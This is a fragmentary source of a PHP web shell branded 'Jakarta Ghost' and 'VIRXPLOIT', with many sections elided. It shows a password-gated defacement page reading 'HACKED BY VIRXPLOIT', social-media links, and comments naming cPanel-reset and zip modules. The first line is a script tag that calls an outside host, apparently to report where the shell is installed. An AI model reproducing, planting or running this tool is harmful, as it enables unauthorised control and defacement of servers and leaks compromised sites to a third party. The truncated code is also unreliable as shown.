<script src=http://JakartaGhost.com/kaydet.php></script>
<?php
...
/* Configurasi */
$aupas 			= "bcf3a073d6c1da25ee3e61c6f689ba4c";// virxploit&jakartaghost
...
<html>
	<head>
		...
		<meta name="author" content="VIRXPLOIT"/>
		<meta name="copyright" content="{ VIRXPLOIT}"/>
		</style>
<style>
body{
  background-image:url("https://i.ibb.co/S7bHhtw/IMG-20231125-WA0017.jpg");background-repeat: no-repeat;animation:none;background-size: 100% 100%;}
</style>
</head>
		<title>{ VIRXPLOIT }</title>
		<link rel="icon" type="image/png" href="https://i.ibb.co/TTj4pSk/IMG-20240203-WA0009.jpg"/>
	...
	<body class="bg-dark text-center text-light">
		<div class="container text-center mt-3">
			<center>
				<img src="https://g.top4top.io/p_3107bn6cv0.png" height="200" width="200"><br>
<center><font color=red size="5" face=courier New">HACKED BY
<font color=red>VIRXPLOIT</font></center><p><font color=red>Jangan mudah menyerah karena dengan<br> menyerah pasti hidup tidak akan mudah.
<br></p><center><font color=red size="4" face=courier New">
		...
		<a href="https://facebook.com/amirxploit" class="text-muted fixed-bottom mb-3">Copyright 2024 JAKARTA CYBER WHITE</a>
	</body>
</html>
<?php
exit;
...
function about(){
	echo '<div class="card text-center bg-light about">
		<h4 class="card-header">{ virxploit Jakarta Ghost }</h4>
		<div class="card-body">
			<center><div class="img"></div></center>
			<p class="card-text">{ virxploit Jakarta Ghost } Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem.</p>
		</div>
		<div class="card-footer">
			<small class="card-text text-muted">Copyright 2019 { virxploit Jakarta Ghost }</small>
		</div>
	</div><br/>';
	exit;
}
...
<html>
	<head>
		...
		<title>{ amirxploit Jakarta Ghost sHell }</title>
	...
	<body class="bg-dark text-light">
		...
		<nav class="navbar static-top navbar-dark">
			...
			<div class="collapse navbar-collapse" id="info">
				<ul>
					<a href="https://facebook.com/amirxploitOfficial" class="lain"><i class="fa fa-facebook tambah"></i></a>
					<a href="https://www.instagram.com/amirxploit.id" class="lain"><i class="fa fa-instagram tambah"></i></a>
					<a href="https://www.youtube.com/amirxploit Jakarta Ghost" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
					<a href="https://github.com/amirxploitid" class="lain"><i class="fa fa-github tambah"></i></a>
					<a href="https://amirxploit.web.id" class="lain"><i class="fa fa-globe tambah"></i></a>
				</ul>
			</div>
		</nav>
		<?php
		echo '<div class="container">
			<h1 class="text-center"><a href="https://facebook.com/amirxploitOfficial" style="color:#ffffff;">{ virxploit }</h1>
			...
			<div class="col-md-7 mt-4">';
				...
				*/
				...
				/*
					* Auto Reset Cpanel
					* amirxploit Jakarta Ghost -Fauzan-
				*/
				...
				*/
				...
				/*
					* Zip Menu
					* amirxploit Jakarta Ghost -Rizsyard-
				*/
...
';
				...
				echo '</table></div><hr/>
				<center><a class="text-muted" href="https://Jakarta Ghost.com/">Copyright 2019 { amirxploit Download Jakarta Ghost }</a></center><br/>';	
